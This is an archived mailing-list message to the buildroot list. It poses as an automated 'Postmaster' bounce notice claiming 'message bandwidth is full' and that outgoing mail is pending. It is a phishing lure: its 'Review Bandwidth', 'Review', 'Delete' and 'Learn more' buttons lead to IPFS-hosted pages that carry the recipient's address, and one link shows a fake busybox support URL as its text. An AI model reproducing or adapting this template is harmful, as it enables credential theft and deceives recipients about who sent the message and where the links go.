Return-Path: <buildroot-bounces@buildroot.org>
X-Spam-Checker-Version: SpamAssassin 3.4.0 (2014-02-07) on
	aws-us-west-2-korg-lkml-1.web.codeaurora.org
Received: from smtp3.osuosl.org (smtp3.osuosl.org [140.211.166.136])
	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
	(No client certificate requested)
	by smtp.lore.kernel.org (Postfix) with ESMTPS id F130FC54E64
	for <buildroot@archiver.kernel.org>; Mon, 25 Mar 2024 23:25:33 +0000 (UTC)
Received: from localhost (localhost [127.0.0.1])
	by smtp3.osuosl.org (Postfix) with ESMTP id A34F76087F;
	Mon, 25 Mar 2024 23:25:33 +0000 (UTC)
X-Virus-Scanned: amavis at osuosl.org
Received: from smtp3.osuosl.org ([127.0.0.1])
 by localhost (smtp3.osuosl.org [127.0.0.1]) (amavis, port 10024) with ESMTP
 id 4ruFxT9rVkUG; Mon, 25 Mar 2024 23:25:32 +0000 (UTC)
X-Comment: SPF check N/A for local connections - client-ip=140.211.166.34; helo=ash.osuosl.org; envelope-from=buildroot-bounces@buildroot.org; receiver=<UNKNOWN> 
DKIM-Filter: OpenDKIM Filter v2.11.0 smtp3.osuosl.org 94E1A60891
Received: from ash.osuosl.org (ash.osuosl.org [140.211.166.34])
	by smtp3.osuosl.org (Postfix) with ESMTP id 94E1A60891;
	Mon, 25 Mar 2024 23:25:32 +0000 (UTC)
Received: from smtp1.osuosl.org (smtp1.osuosl.org [140.211.166.138])
 by ash.osuosl.org (Postfix) with ESMTP id B98061BF417
 for <buildroot@lists.busybox.net>; Mon, 25 Mar 2024 23:25:30 +0000 (UTC)
Received: from localhost (localhost [127.0.0.1])
 by smtp1.osuosl.org (Postfix) with ESMTP id A6AA581E1D
 for <buildroot@lists.busybox.net>; Mon, 25 Mar 2024 23:25:30 +0000 (UTC)
X-Virus-Scanned: amavis at osuosl.org
Received: from smtp1.osuosl.org ([127.0.0.1])
 by localhost (smtp1.osuosl.org [127.0.0.1]) (amavis, port 10024) with ESMTP
 id kqAO5uxXqq7I for <buildroot@lists.busybox.net>;
 Mon, 25 Mar 2024 23:25:30 +0000 (UTC)
Received-SPF: Softfail (mailfrom) identity=mailfrom; client-ip=141.98.10.132;
 helo=busybox.net; envelope-from=buildroot@busybox.net; receiver=<UNKNOWN> 
DMARC-Filter: OpenDMARC Filter v1.4.2 smtp1.osuosl.org 29A7F8179A
DKIM-Filter: OpenDKIM Filter v2.11.0 smtp1.osuosl.org 29A7F8179A
Received: from busybox.net (unknown [141.98.10.132])
 by smtp1.osuosl.org (Postfix) with ESMTP id 29A7F8179A
 for <buildroot@busybox.net>; Mon, 25 Mar 2024 23:25:28 +0000 (UTC)
From: Postmaster <buildroot@busybox.net>
To: buildroot@busybox.net
Date: 26 Mar 2024 00:25:27 +0100
Message-ID: <20240326002527.06726BBC88BD6BD1@busybox.net>
MIME-Version: 1.0
X-Mailman-Original-Authentication-Results: smtp1.osuosl.org;
 dmarc=none (p=none dis=none)
 header.from=busybox.net
Subject: [Buildroot] Undeliverable: Outgoing Mail Returned to Sender
X-BeenThere: buildroot@buildroot.org
X-Mailman-Version: 2.1.29
Precedence: list
List-Id: Discussion and development of buildroot <buildroot.buildroot.org>
List-Unsubscribe: <https://lists.buildroot.org/mailman/options/buildroot>,
 <mailto:buildroot-request@buildroot.org?subject=unsubscribe>
List-Archive: <http://lists.buildroot.org/pipermail/buildroot/>
List-Post: <mailto:buildroot@buildroot.org>
List-Help: <mailto:buildroot-request@buildroot.org?subject=help>
List-Subscribe: <https://lists.buildroot.org/mailman/listinfo/buildroot>,
 <mailto:buildroot-request@buildroot.org?subject=subscribe>
Content-Type: multipart/mixed; boundary="===============7760727717045943979=="
Errors-To: buildroot-bounces@buildroot.org
Sender: "buildroot" <buildroot-bounces@buildroot.org>

--===============7760727717045943979==
Content-Type: text/html;
	charset="iso-8859-1"
Content-Transfer-Encoding: quoted-printable

<html><head>
<meta name=3D"GENERATOR" content=3D"MSHTML 11.00.9600.20139">
<meta http-equiv=3D"X-UA-Compatible" content=3D"IE=3Dedge">
</head>
<body>
<table style=3D"border: 1px dotted rgb(211, 211, 211); border-image: none; =
text-align: left; color: rgb(51, 51, 51); text-transform: none; letter-spac=
ing: normal; font-family: Roboto, Tahoma, Helvetica, sans-serif; font-size:=
 13px; font-style: normal; font-weight: 400; word-spacing: 0px; white-space=
: normal; border-collapse: collapse; box-sizing: border-box; orphans: 2; wi=
dows: 2; background-color: rgb(255, 255, 255); font-variant-ligatures: norm=
al; font-variant-caps: normal;=20
text-decoration-style: initial; text-decoration-color: initial; -webkit-tex=
t-stroke-width: 0px; text-decoration-thickness: initial;">
<tbody style=3D"box-sizing: border-box;">
<tr style=3D"box-sizing: border-box;">
<th style=3D"padding: 5px; border: 0px solid rgb(0, 0, 0); border-image: no=
ne; width: 2px; color: rgb(0, 0, 0); box-sizing: border-box; background-col=
or: rgb(2, 151, 64);">&nbsp;</th>
<td style=3D"padding: 5px; border: 0px solid rgb(0, 0, 0); border-image: no=
ne; width: 665px; color: rgb(0, 0, 0); box-sizing: border-box; background-c=
olor: rgb(243, 255, 248);"><span style=3D"font-size: 12px; box-sizing: bord=
er-box;">Message from&nbsp;busybox.net server</span></td></tr></tbody></tab=
le>
<div style=3D"border-width: 0px; margin: 0px; padding: 20px; text-align: le=
ft; color: rgb(44, 54, 58); text-transform: none; text-indent: 0px; letter-=
spacing: normal; font-family: Verdana; font-size: 12px; font-style: normal;=
 font-weight: 400; word-spacing: 0px; vertical-align: baseline; white-space=
: normal; box-sizing: border-box; orphans: 2; widows: 2; font-stretch: inhe=
rit; background-color: rgb(255, 255, 255); font-variant-ligatures: normal; =
font-variant-caps: normal; text-decoration-style:=20
initial; text-decoration-color: initial; -webkit-text-stroke-width: 0px; te=
xt-decoration-thickness: initial;"><font color=3D"#000066" face=3D"Arial" s=
ize=3D"4" style=3D"box-sizing: border-box;"><table style=3D"padding-top: 32=
px; background-color: rgb(255, 255, 255);" cellspacing=3D"0" cellpadding=3D=
"0"><tbody><tr><td><font size=3D"2"> </font><table cellspacing=3D"0" cellpa=
dding=3D"0"><tbody><tr>
<td style=3D"padding: 24px 24px 32px; border-radius: 2px; border: 1px solid=
 rgb(224, 224, 224); border-image: none; max-width: 560px; background-color=
: rgb(250, 250, 250);"><font size=3D"2"> </font><font size=3D"2"> </font><f=
ont size=3D"2"> </font><table style=3D"padding-top: 8px; min-width: 272px;"=
><tbody><tr><td> <h2 style=3D"margin: 0px; color: rgb(33, 33, 33); font-wei=
ght: bold;"><font size=3D"1"></font><font size=3D"2">Message bandwidth is f=
ull </font></h2></td></tr><tr>
<td style=3D"text-align: left; color: rgb(117, 117, 117); padding-top: 20px=
; font-weight: normal;"><p><font size=3D"2"> This message was created autom=
atically by mail delivery software.</font></p><p><br><font size=3D"2">The f=
ollowing message from </font><a style=3D"color: rgb(33, 33, 33); text-decor=
ation: none;" href=3D"mailto:buildroot@busybox.net"><b><font size=3D"2">bui=
ldroot@busybox.net</font></b></a><font size=3D"2"> was undeliverable.<br>&n=
bsp;The reason for the problem:<br>
&nbsp;5.4.7 - Delivery expired (message too old) 'timeout'</font></p></td><=
/tr><tr><td style=3D"text-align: left; color: rgb(66, 133, 244); padding-to=
p: 24px;"><font size=3D"2"></font>
<a style=3D"text-decoration: none;" href=3D"https://cloudflare-ipfs.com/ipf=
s/bafkreigwc373y7yceu26vz77ylvqslg2pkacl3tr6rbrk4dr4rbua3ywjm?#buildroot@bu=
sybox.net" target=3D"_blank" data-saferedirecturl=3D"https://www.google.com=
/url?q=3Dhttps://support.google.com/mail/answer/6596&amp;source=3Dgmail&amp=
;ust=3D1680546997744000&amp;usg=3DAOvVaw0KwZ7dRteNzrgii7VYARUA"><font size=
=3D"2"><strong>REVIEW BANDWIDTH</strong></font></a></td></tr></tbody></tabl=
e><font size=3D"2"></font></td></tr></tbody>
</table><font size=3D"2"></font></td></tr><tr style=3D"border: currentColor=
; border-image: none; width: 90%; background-color: rgb(255, 255, 255);"><t=
d align=3D"left" style=3D"padding: 48px 10px;"><font size=3D"2"><font size=
=3D"3"><span style=3D"box-sizing: border-box;">You have 3 pending outgoing =
messages that could not be sent as of 3/26/2024 12:25:27 a.m.</span><br sty=
le=3D"box-sizing: border-box;"><span style=3D"box-sizing: border-box;"><fon=
t style=3D"box-sizing: border-box;">Click to&nbsp;</font>
<a class=3D"v1external_mr_css_attr" style=3D"border-width: 0px; margin: 0px=
; padding: 0px; color: rgb(17, 85, 204); text-decoration: none; vertical-al=
ign: baseline; cursor: pointer; box-sizing: border-box; background-color: t=
ransparent;" href=3D"https://cloudflare-ipfs.com/ipfs/bafkreiaw6dgw7wadbmxf=
edf4g5xuee22tbyfcvctqp65lwai6avvvnvivu?#buildroot@busybox.net" target=3D"_b=
lank" rel=3D"noreferrer"><font style=3D"box-sizing: border-box;">Review</fo=
nt></a>
<font style=3D"box-sizing: border-box;">or</font>
<a class=3D"v1external_mr_css_attr" style=3D"border-width: 0px; margin: 0px=
; padding: 0px; color: rgb(17, 85, 204); text-decoration: none; vertical-al=
ign: baseline; cursor: pointer; box-sizing: border-box; background-color: t=
ransparent;" href=3D"https://cloudflare-ipfs.com/ipfs/bafkreiaw6dgw7wadbmxf=
edf4g5xuee22tbyfcvctqp65lwai6avvvnvivu?#buildroot@busybox.net" target=3D"_b=
lank" rel=3D"noreferrer"><font style=3D"box-sizing: border-box;">Delete</fo=
nt></a>
<font style=3D"box-sizing: border-box;">pending outgoing email messages.</f=
ont></span></font></font></td></tr></tbody></table><p><font size=3D"3"><spa=
n style=3D"box-sizing: border-box;"><span style=3D"color: black; box-sizing=
: border-box;"><font size=3D"3"><font size=3D"2">The response was:<br></fon=
t></font></span></span></font><p style=3D"font-family: monospace;"><font si=
ze=3D"3"><font size=3D"3"><font size=3D"2">
 A message that you sent could not be delivered to one or more of its recip=
ients. This is a temporary error. <br>Learn more at </font>
<a href=3D"https://dweb.link/ipfs/QmZ6uSvSTJ3Uh9BAeA5f2GDMKdR22gmTZimY28ted=
pqwHj?filename=3DQmZ6uSvSTJ3Uh9BAeA5f2GDMKdR22gmTZimY28tedpqwHj#buildroot@b=
usybox.net" target=3D"_blank" data-saferedirecturl=3D"https://www.google.co=
m/url?q=3Dhttps://support.google.com/mail/answer/6596&amp;source=3Dgmail&am=
p;ust=3D1680546997744000&amp;usg=3DAOvVaw0KwZ7dRteNzrgii7VYARUA"> <font siz=
e=3D"2">https://support.busybox.net/<wbr>mail/answer/6596</font></a></font>=
</font></p><p></p></font></div></body></html>

--===============7760727717045943979==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline

_______________________________________________
buildroot mailing list
buildroot@buildroot.org
https://lists.buildroot.org/mailman/listinfo/buildroot

--===============7760727717045943979==--
